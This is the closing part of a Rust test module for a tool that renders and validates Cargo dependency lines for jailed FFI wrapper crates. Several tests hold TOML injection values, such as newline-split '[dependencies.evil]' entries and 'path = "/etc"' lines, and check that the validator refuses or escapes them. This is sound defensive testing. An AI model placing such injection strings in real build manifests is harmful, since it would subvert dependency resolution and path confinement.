        );
    }

    #[test]
    fn wrapper_path_naming_a_file_is_refused() {
        let (project, _) = scratch_project("file");
        std::fs::write(project.join("wrappers/engine/lib.rs"), "").expect("scratch file");
        let pkg = wrapper_pkg("wrappers/engine/lib.rs").expect("decodes");
        let r = cargo_dep_lines(&pkg, &FfiCache::at_project_root(&project));
        let _ = std::fs::remove_dir_all(&project);
        assert!(
            matches!(
                jail_defect(&r),
                Some(crate::diag::WireDefect::WrapperPathUnresolvable { .. })
            ),
            "{r:?}"
        );
    }

    #[test]
    fn unanchored_cache_root_refuses_to_jail() {
        let (project, _) = scratch_project("unanchored");
        let pkg = wrapper_pkg("wrappers/engine").expect("decodes");
        let cache = FfiCache {
            root: project.clone(),
        };
        let r = cargo_dep_lines(&pkg, &cache);
        let _ = std::fs::remove_dir_all(&project);
        assert!(
            matches!(
                jail_defect(&r),
                Some(crate::diag::WireDefect::CacheRootUnanchored { .. })
            ),
            "{r:?}"
        );
    }

    #[test]
    fn cache_project_root_strips_the_cache_suffix() {
        let cache = FfiCache::at_project_root(Path::new("/srv/app"));
        assert_eq!(cache.project_root().ok(), Some(Path::new("/srv/app")));
        let here = FfiCache::at_project_root(Path::new(""));
        assert_eq!(here.project_root().ok(), Some(Path::new(".")));
    }

    /// A legacy consumer manifest carrying `cargo_deps` as its dependency list.
    fn legacy_consumer_with_deps(cargo_deps: &serde_json::Value) -> String {
        json!({
            "moduleName": "Rust.Semver",
            "kernelName": "Rust_Semver",
            "opaqueTypes": { "Version": "::semver::Version" },
            "defineTypes": [],
            "cargoDeps": cargo_deps,
            "bindings": []
        })
        .to_string()
    }

    /// A legacy manifest cannot re-derive a wrapper crate's source, so any
    /// stored line outside the exact registry-pin grammar — a `path` line in
    /// any spelling, a split key, an injected newline — is refused rather than
    /// forwarded into the emitted manifest.
    #[test]
    fn legacy_manifest_with_off_grammar_dep_line_is_refused() {
        for (i, line) in [
            "engine_wrap = { path = \"/etc\" }",
            "engine_wrap = {path=\"/etc\"}",
            "engine_wrap = { path\t= \"/etc\" }",
            "semver = { version = \"=1.0.0\", path = \"/etc\" }",
            "semver\n[dependencies.evil] = \"=1.0.0\"",
            "semver = \"=1.0.0\"\nevil = { path = \"/etc\" }",
            "semver = \"=\"",
            "semver = \"1.0.0\"",
            "semver  = \"=1.0.0\"",
            "semver = { version = \"=1.0.0\", features = [] }",
            "semver = { version = \"=1.0.0\", features = [\"a\",\"b\"] }",
        ]
        .into_iter()
        .enumerate()
        {
            let consumer = legacy_consumer_with_deps(&json!([line]));
            let cache_root = write_legacy_cache(&format!("off_grammar_{i}"), &consumer);
            let r = load_catalog(&cache_root);
            let _ = std::fs::remove_dir_all(&cache_root);
            assert!(
                matches!(
                    &r,
                    Err(Diagnostic::WireMalformed {
                        defect: crate::diag::WireDefect::LegacyDependencyLine { got },
                        ..
                    }) if got == line
                ),
                "{line:?} must be refused as a typed legacy line: {r:?}"
            );
        }
    }

    /// A non-string `cargoDeps` entry or a non-array `cargoDeps` is refused,
    /// never skipped.
    #[test]
    fn legacy_manifest_with_non_string_dep_entry_is_refused() {
        let non_string = "`cargoDeps` carries a non-string entry";
        for (i, (deps, expected)) in [
            (json!([42]), non_string),
            (json!(["semver = \"=1.0.0\"", null]), non_string),
            (json!("x"), "`cargoDeps` is not an array"),
        ]
        .iter()
        .enumerate()
        {
            let consumer = legacy_consumer_with_deps(deps);
            let cache_root = write_legacy_cache(&format!("non_string_dep_{i}"), &consumer);
            let r = load_catalog(&cache_root);
            let _ = std::fs::remove_dir_all(&cache_root);
            assert!(
                matches!(
                    &r,
                    Err(Diagnostic::WireMalformed {
                        defect: crate::diag::WireDefect::Json { detail },
                        ..
                    }) if detail == expected
                ),
                "{deps} must be refused: {r:?}"
            );
        }
    }

    /// A `path` line is outside the registry-pin grammar and is refused with
    /// the typed legacy-line defect carrying the line verbatim.
    #[test]
    fn parse_registry_line_refuses_a_path_line_typed() {
        let line = "engine_wrap = { path = \"/etc\" }";
        assert_eq!(
            CargoDep::parse_registry_line(line),
            Err(crate::diag::WireDefect::LegacyDependencyLine {
                got: line.to_owned()
            })
        );
    }

    /// A legacy line in the exact rendered grammar loads as a typed registry pin.
    #[test]
    fn legacy_manifest_registry_lines_load_typed() {
        let lines = [
            "semver = \"=1.0.0\"",
            "serde = { version = \"=1.0.200\", features = [\"derive\", \"std\"] }",
        ];
        let consumer = legacy_consumer_with_deps(&json!(lines));
        let cache_root = write_legacy_cache("registry_lines", &consumer);
        let r = load_catalog(&cache_root);
        let _ = std::fs::remove_dir_all(&cache_root);
        let catalog = r.expect("exact registry lines load");
        let entry = catalog.first().expect("one entry");
        let rendered: Vec<String> = entry.cargo_deps.iter().map(CargoDep::render).collect();
        assert_eq!(rendered, lines);
        assert!(
            entry
                .cargo_deps
                .iter()
                .all(|d| matches!(d, CargoDep::Registry { .. }))
        );
    }

    /// Every line the renderer emits for a registry pin parses back to the
    /// same typed value.
    #[test]
    fn rendered_registry_line_round_trips() {
        let lines = cargo_deps(&semver_pkg(), &registry_cache()).expect("renders");
        assert!(!lines.is_empty());
        for dep in lines {
            assert_eq!(
                CargoDep::parse_registry_line(&dep.render()).ok(),
                Some(dep.clone()),
                "{dep:?}"
            );
        }
    }

    /// A stored transparent-parameter slot that is neither a type name nor
    /// `null` is refused, never read as "no conversion".
    #[test]
    fn legacy_manifest_with_non_string_transparent_param_is_refused() {
        let consumer = json!({
            "moduleName": "Rust.Semver",
            "kernelName": "Rust_Semver",
            "opaqueTypes": { "Version": "::semver::Version" },
            "defineTypes": [],
            "cargoDeps": [],
            "bindings": [{
                "refName": "parse",
                "wrapperIdent": "semver_parse",
                "arity": 1,
                "sig": "String -> Result Error Version",
                "transparentParams": [7]
            }]
        })
        .to_string();
        let cache_root = write_legacy_cache("non_string_param", &consumer);
        let r = load_catalog(&cache_root);
        let _ = std::fs::remove_dir_all(&cache_root);
        assert!(
            matches!(
                &r,
                Err(Diagnostic::WireMalformed {
                    defect: crate::diag::WireDefect::Json { detail },
                    ..
                }) if detail.contains("transparentParams[0]")
            ),
            "{r:?}"
        );
    }

    /// Every string, whatever it holds, round-trips through the TOML basic
    /// string renderer as exactly one value.
    #[test]
    fn toml_basic_string_round_trips() {
        for text in [
            "plain",
            "quote\"inside",
            "back\\slash",
            "new\nline",
            "c++/proj/\u{c1}rea",
            "\u{1}\u{7f}\u{85}\t\r\u{8}\u{c}",
            "\"\n[dependencies.evil]\npath = \"/etc\"\n\"",
            "",
        ] {
            let doc = format!("x = {}", toml_basic_string(text));
            let table: toml::Table = toml::from_str(&doc).expect("renders valid TOML");
            assert_eq!(table.len(), 1, "{doc:?} must hold one key");
            assert_eq!(
                table.get("x").and_then(toml::Value::as_str),
                Some(text),
                "{doc:?}"
            );
        }
    }

    /// A wrapper crate under a root whose name carries `+` or a non-ASCII
    /// letter renders a `path` that parses back to the canonical directory.
    #[test]
    fn wrapper_dir_under_a_plus_or_non_ascii_root_renders() {
        for name in ["plus+root", "\u{c1}rea"] {
            let (project, canonical) = scratch_project(name);
            let pkg = wrapper_pkg("wrappers/engine").expect("decodes");
            let r = cargo_dep_lines(&pkg, &FfiCache::at_project_root(&project));
            let deps = r.expect("jails inside the root");
            let path = deps.first().and_then(|line| parsed_path(line));
            let back = path.as_deref().and_then(|p| std::fs::canonicalize(p).ok());
            let _ = std::fs::remove_dir_all(&project);
            assert!(
                path.as_deref()
                    .is_some_and(|p| p.contains(name) && !p.starts_with("\\\\?\\")),
                "{deps:?}"
            );
            assert_eq!(back, Some(canonical), "{deps:?}");
        }
    }

    /// A root whose name carries a quote or a backslash renders an escaped
    /// `path` that parses back to exactly the canonical directory.
    #[cfg(unix)]
    #[test]
    fn wrapper_dir_under_a_quote_or_backslash_root_renders_escaped() {
        for name in ["quote\"root", "back\\slash"] {
            let (project, canonical) = scratch_project(name);
            let text = canonical.to_str().expect("utf-8 temp path").to_owned();
            let pkg = wrapper_pkg("wrappers/engine").expect("decodes");
            let r = cargo_dep_lines(&pkg, &FfiCache::at_project_root(&project));
            let _ = std::fs::remove_dir_all(&project);
            let deps = r.expect("jails inside the root");
            assert_eq!(
                deps.first().and_then(|line| parsed_path(line)),
                Some(text),
                "{deps:?}"
            );
        }
    }

    /// A root whose name carries a control character has no renderable
    /// `path` value and is refused.
    #[cfg(unix)]
    #[test]
    fn wrapper_dir_under_a_control_char_root_is_unrenderable() {
        let (project, _) = scratch_project("new\nline");
        let pkg = wrapper_pkg("wrappers/engine").expect("decodes");
        let r = cargo_deps(&pkg, &FfiCache::at_project_root(&project));
        let _ = std::fs::remove_dir_all(&project);
        assert!(
            matches!(
                jail_defect(&r),
                Some(crate::diag::WireDefect::WrapperPathUnrenderable { canonical, .. })
                    if canonical.contains("new\nline")
            ),
            "{r:?}"
        );
    }

    /// On Windows the verbatim drive prefix is stripped through the typed
    /// conversion, and the rendered path resolves to the canonical directory.
    #[cfg(windows)]
    #[test]
    fn wrapper_crate_renders_a_plain_drive_path_on_windows() {
        let (project, canonical) = scratch_project("windows");
        let pkg = wrapper_pkg("wrappers/engine").expect("decodes");
        let r = cargo_dep_lines(&pkg, &FfiCache::at_project_root(&project));
        let deps = r.expect("jails inside the root");
        let path = deps.first().and_then(|line| parsed_path(line));
        let back = path.as_deref().and_then(|p| std::fs::canonicalize(p).ok());
        let _ = std::fs::remove_dir_all(&project);
        assert!(
            path.as_deref().is_some_and(|p| !p.starts_with("\\\\?\\")),
            "{deps:?}"
        );
        assert_eq!(back, Some(canonical));
    }

    /// A wrapper directory with no `Cargo.toml` is refused at the jail.
    #[test]
    fn wrapper_dir_without_a_manifest_is_refused() {
        let (project, canonical) = scratch_project("no-manifest");
        std::fs::remove_file(canonical.join("Cargo.toml")).expect("remove manifest");
        let pkg = wrapper_pkg("wrappers/engine").expect("decodes");
        let r = cargo_deps(&pkg, &FfiCache::at_project_root(&project));
        let _ = std::fs::remove_dir_all(&project);
        assert!(
            matches!(
                manifest_defect(&r),
                Some(crate::diag::WrapperManifestDefect::Unreadable { .. })
            ),
            "{r:?}"
        );
    }

    /// A symlinked `Cargo.toml` is refused rather than followed.
    #[cfg(unix)]
    #[test]
    fn wrapper_manifest_symlink_is_refused() {
        let (project, canonical) = scratch_project("manifest-link");
        std::fs::write(project.join("real.toml"), ENGINE_MANIFEST).expect("scratch file");
        std::fs::remove_file(canonical.join("Cargo.toml")).expect("remove manifest");
        std::os::unix::fs::symlink(project.join("real.toml"), canonical.join("Cargo.toml"))
            .expect("symlink");
        let pkg = wrapper_pkg("wrappers/engine").expect("decodes");
        let r = cargo_deps(&pkg, &FfiCache::at_project_root(&project));
        let _ = std::fs::remove_dir_all(&project);
        assert_eq!(
            manifest_defect(&r),
            Some(&crate::diag::WrapperManifestDefect::NotRegularFile),
            "{r:?}"
        );
    }

    /// A directory named `Cargo.toml` is not a regular file and is refused.
    #[cfg(unix)]
    #[test]
    fn wrapper_manifest_directory_is_refused() {
        let (project, canonical) = scratch_project("manifest-dir");
        std::fs::remove_file(canonical.join("Cargo.toml")).expect("remove manifest");
        std::fs::create_dir(canonical.join("Cargo.toml")).expect("manifest dir");
        let pkg = wrapper_pkg("wrappers/engine").expect("decodes");
        let r = cargo_deps(&pkg, &FfiCache::at_project_root(&project));
        let _ = std::fs::remove_dir_all(&project);
        assert_eq!(
            manifest_defect(&r),
            Some(&crate::diag::WrapperManifestDefect::NotRegularFile),
            "{r:?}"
        );
    }

    /// A manifest one byte past the ceiling is refused; one at it loads.
    #[test]
    fn wrapper_manifest_past_the_ceiling_is_refused() {
        let limit = usize::try_from(crate::pkginfo::WRAPPER_MANIFEST_LIMIT).expect("fits");
        let pad = |len: usize| {
            let mut bytes = ENGINE_MANIFEST.as_bytes().to_vec();
            bytes.push(b'#');
            bytes.resize(len, b'x');
            bytes
        };
        let over = load_with_manifest("manifest-over", &pad(limit + 1));
        assert_eq!(
            manifest_defect(&over),
            Some(&crate::diag::WrapperManifestDefect::Oversized {
                limit: crate::pkginfo::WRAPPER_MANIFEST_LIMIT
            }),
            "{over:?}"
        );
        let at = load_with_manifest("manifest-at", &pad(limit));
        assert!(at.is_ok(), "{at:?}");
    }

    /// A manifest that is not UTF-8 TOML with a string `[package] name` is
    /// refused as invalid.
    #[test]
    fn wrapper_manifest_without_a_string_package_name_is_refused() {
        for (i, manifest) in [
            b"[lib]\nname = \"engine_wrap\"\n".as_slice(),
            b"[package]\nname = { workspace = true }\n".as_slice(),
            b"[package]\nversion = \"0.1.0\"\n".as_slice(),
            b"[package\nname = \"engine_wrap\"\n".as_slice(),
            b"[package]\nname = \"engine_wrap\"\nname = \"other\"\n".as_slice(),
            b"[package]\nname = \"engine\xff_wrap\"\n".as_slice(),
        ]
        .into_iter()
        .enumerate()
        {
            let r = load_with_manifest(&format!("manifest-invalid-{i}"), manifest);
            assert!(
                matches!(
                    manifest_defect(&r),
                    Some(crate::diag::WrapperManifestDefect::Invalid { .. })
                ),
                "{:?}: {r:?}",
                String::from_utf8_lossy(manifest)
            );
        }
    }

    /// A `[package] name` outside the dependency-key charset is refused.
    #[test]
    fn wrapper_manifest_with_an_illegal_package_name_is_refused() {
        let r = load_with_manifest("manifest-illegal", b"[package]\nname = \"9lives\"\n");
        assert_eq!(
            manifest_defect(&r),
            Some(&crate::diag::WrapperManifestDefect::PackageNameIllegal {
                found: "9lives".to_owned()
            }),
            "{r:?}"
        );
    }

    /// A `[package] name` other than the installed package's name is refused,
    /// so the dependency key and the crate cargo finds cannot disagree.
    #[test]
    fn wrapper_manifest_naming_another_package_is_refused() {
        let r = load_with_manifest("manifest-mismatch", b"[package]\nname = \"other_wrap\"\n");
        assert_eq!(
            manifest_defect(&r),
            Some(&crate::diag::WrapperManifestDefect::PackageNameMismatch {
                expected: "engine_wrap".to_owned(),
                found: "other_wrap".to_owned()
            }),
            "{r:?}"
        );
    }

    /// A wrapper crate's typed entry carries the jailed directory and renders
    /// the one `path` line.
    #[test]
    fn wrapper_crate_yields_a_typed_path_entry() {
        let (project, canonical) = scratch_project("typed");
        let pkg = wrapper_pkg("wrappers/engine").expect("decodes");
        let r = cargo_deps(&pkg, &FfiCache::at_project_root(&project));
        let _ = std::fs::remove_dir_all(&project);
        let deps = r.expect("jails inside the root");
        assert!(
            matches!(deps.as_slice(), [CargoDep::Wrapper { .. }]),
            "expected one wrapper entry: {deps:?}"
        );
        let [dep] = deps.as_slice() else {
            return;
        };
        let CargoDep::Wrapper { dir, features } = dep else {
            return;
        };
        assert_eq!(dep.name().as_str(), "engine_wrap");
        assert_eq!(dir.package().as_str(), "engine_wrap");
        assert_eq!(Some(dir.as_str()), canonical.to_str());
        assert!(features.is_empty());
    }

    /// Stored transparent-parameter slots that disagree with the binding's
    /// arity are refused at load, never handed to the backend's per-position
    /// glue lookup.
    #[test]
    fn legacy_manifest_with_misaligned_transparent_params_is_refused() {
        let consumer = json!({
            "moduleName": "Rust.Semver",
            "kernelName": "Rust_Semver",
            "opaqueTypes": { "Version": "::semver::Version" },
            "defineTypes": [],
            "cargoDeps": [],
            "bindings": [{
                "refName": "parse",
                "wrapperIdent": "semver_parse",
                "arity": 1,
                "sig": "String -> Result Error Version",
                "transparentParams": [null, "Version"]
            }]
        })
        .to_string();
        let cache_root = write_legacy_cache("misaligned", &consumer);
        let r = load_catalog(&cache_root);
        let _ = std::fs::remove_dir_all(&cache_root);
        assert!(
            matches!(
                &r,
                Err(Diagnostic::WireMalformed {
                    defect: crate::diag::WireDefect::Json { detail },
                    ..
                }) if detail.contains("transparent-parameter slots")
            ),
            "{r:?}"
        );
    }
}
